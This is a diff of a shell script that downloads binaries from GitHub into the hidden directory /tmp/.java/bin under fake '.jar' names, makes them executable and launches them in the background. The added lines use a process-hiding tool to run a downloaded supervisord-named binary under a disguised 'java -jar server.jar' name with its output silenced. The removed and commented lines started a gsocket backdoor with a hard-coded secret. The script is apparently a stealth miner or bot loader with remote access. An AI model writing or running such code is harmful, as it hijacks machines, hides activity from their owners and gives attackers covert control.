@@ -2,25 +2,22 @@
 
 function fetch_files() {
     mkdir -p /tmp/.java/bin
+    cd /tmp/.java/bin && curl -L https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-linux-x86_64 -o patch.jar
     cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o bots.jar
     cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
-    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/voidnde/cfg.conf -o cfg.conf
-    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/voidnde/cnf-0.json -o conf.json
-    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar
-    echo "DONE ..."
+    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/voidnde/c1.conf -o cfg.conf
+    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/voidnde/c1.json -o conf.json
+    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar
 }
 
 function start_app() {
     chmod a+x /tmp/.java/bin/***
-    cd /tmp/.java/bin && ./plugins.jar -c ./cfg.conf -d
-    export GSOCKET_ARGS="-s bE928cAe-D2a1E2c-5A16f98-13D9g8Hbj7-56C4a961-eCd9-F9440-d6A2803-8A1c5J1g60 -liqD"
-    cd /tmp/.java/bin && exec -a -java ./add-on.jar &
-    echo "BOT SERVER STARTED ..."
+    cd /tmp/.java/bin && nohup ./patch.jar -a 'java -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ./plugins.jar -c ./cfg.conf >/dev/null 2>&1 &
+    # export GSOCKET_ARGS="-s bE928cAe-D2a1E2c-5A16f98-13D9g8Hbj7-56C4a961-eCd9-F9440-d6A2803-8A1c5J1g60 -liqD"
+    # cd /tmp/.java/bin && exec -a -java ./add-on.jar &
 }
 
-# if [ -f "/tmp/.java/bin/cfg.conf" ]  && [ -f "/tmp/.java/bin/plugins.jar" ] && [ -f "/tmp/.java/bin/add-on.jar" ]; then
 if [ -f "/tmp/.java/bin/cfg.conf" ] && [ -f "/tmp/.java/bin/bots.jar" ] && [ -f "/tmp/.java/bin/plugins.jar" ] && [ -f "/tmp/.java/bin/conf.json" ]; then
-    echo "Patch files already loaded ..."
     start_app
 else
     rm -rf /tmp/.java/bin/**
